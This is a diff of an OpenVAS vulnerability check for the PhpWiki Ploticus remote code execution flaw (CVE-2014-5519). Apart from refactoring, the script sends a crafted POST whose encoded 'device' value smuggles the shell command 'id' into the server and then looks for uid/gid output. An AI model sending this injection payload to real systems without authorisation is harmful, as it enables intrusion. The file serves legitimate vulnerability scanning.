@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_phpwiki_rce_08_14.nasl 2780 2016-03-04 13:12:04Z antu123 $
+# $Id: gb_phpwiki_rce_08_14.nasl 5698 2017-03-23 14:04:51Z cfi $
 #
 # PhpWiki Remote Code Execution Vulnerability
 #
@@ -36,19 +36,15 @@ tag_vuldetect = "Send a special crafted HTTP POST request and check the response
 if (description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.105074");
- script_version ("$Revision: 2780 $");
+ script_version ("$Revision: 5698 $");
  script_cve_id("CVE-2014-5519");
  script_bugtraq_id(69444);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("PhpWiki Remote Code Execution Vulnerability");
-
-
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34451/");
-
- script_tag(name:"last_modification", value:"$Date: 2016-03-04 14:12:04 +0100 (Fri, 04 Mar 2016) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-23 15:04:51 +0100 (Thu, 23 Mar 2017) $");
  script_tag(name:"creation_date", value:"2014-08-29 11:48:21 +0200 (Fri, 29 Aug 2014)");
- script_summary("Determine if it is possible to execute a command");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
@@ -70,47 +66,41 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port( default:80 );
-if( ! get_port_state( port ) ) exit( 0 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-dirs = make_list("/phpwiki", "/wiki", cgi_dirs());
+foreach dir( make_list_unique( "/phpwiki", "/wiki", cgi_dirs( port:port) ) ) {
 
-foreach dir ( dirs )
-{
- url = dir + "/";
- req = http_get( item:url, port:port );
- buf = http_send_recv( port:port, data:req, bodyonly:FALSE );
+  if( dir == "/" ) dir = "";
+  url = dir + "/";
+  buf = http_get_cache( item:url, port:port );
 
- if( "Powered by PhpWiki" >< buf )
- {
-   host = get_host_name();
-   ex = 'pagename=HeIp&edit%5Bcontent%5D=%3C%3CPloticus+device%3D%22%3Becho+123%27%3A%3A%3A%27+1%3E%262%3B' + 
-        'id' + 
-        '+1%3E%262%3Becho+%27%3A%3A%3A%27123+1%3E%262%3B%22+-prefab%3D+-csmap%3D+data%3D+alt%3D+help%3D+%3E%3E' + 
-        '&edit%5Bpreview%5D=Preview&action=edit';
+  if( "Powered by PhpWiki" >< buf ) {
+    host = http_host_name( port:port );
+    ex = 'pagename=HeIp&edit%5Bcontent%5D=%3C%3CPloticus+device%3D%22%3Becho+123%27%3A%3A%3A%27+1%3E%262%3B' + 
+         'id' + 
+         '+1%3E%262%3Becho+%27%3A%3A%3A%27123+1%3E%262%3B%22+-prefab%3D+-csmap%3D+data%3D+alt%3D+help%3D+%3E%3E' + 
+         '&edit%5Bpreview%5D=Preview&action=edit';
 
-   len = strlen( ex );
+    len = strlen( ex );
 
-   req = 'POST ' + dir + '/index.php HTTP/1.1\r\n' +
-         'Host: ' + host + '\r\n' +
-         'Accept-Encoding: identity\r\n' +
-         'Content-Length: ' + len + '\r\n' + 
-         'Content-Type: application/x-www-form-urlencoded\r\n' + 
-         'Connection: close\r\n' + 
-         'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
-         '\r\n' +
-         ex;
+    req = 'POST ' + dir + '/index.php HTTP/1.1\r\n' +
+          'Host: ' + host + '\r\n' +
+          'Accept-Encoding: identity\r\n' +
+          'Content-Length: ' + len + '\r\n' + 
+          'Content-Type: application/x-www-form-urlencoded\r\n' + 
+          'Connection: close\r\n' + 
+          'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+          '\r\n' +
+          ex;
+    result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
-   result = http_send_recv( port:port, data:req, bodyonly:FALSE );
-
-   if( result =~ "uid=[0-9]+.*gid=[0-9]+" )
-   {
-     match = egrep( pattern:"uid=[0-9]+.*gid=[0-9]+", string:result );
-     send_recv = 'Request:\n' + req + '\n\nResponse:\n[...]' + match + '[...]\n';
-     security_message( port:port, expert_info:send_recv );
-     exit( 0 );
-   }
- }
-
+    if( result =~ "uid=[0-9]+.*gid=[0-9]+" ) {
+      match = egrep( pattern:"uid=[0-9]+.*gid=[0-9]+", string:result );
+      send_recv = 'Request:\n' + req + '\n\nResponse:\n[...]' + match + '[...]\n';
+      security_message( port:port, expert_info:send_recv );
+      exit( 0 );
+    }
+  }
 }
 
 exit( 0 );
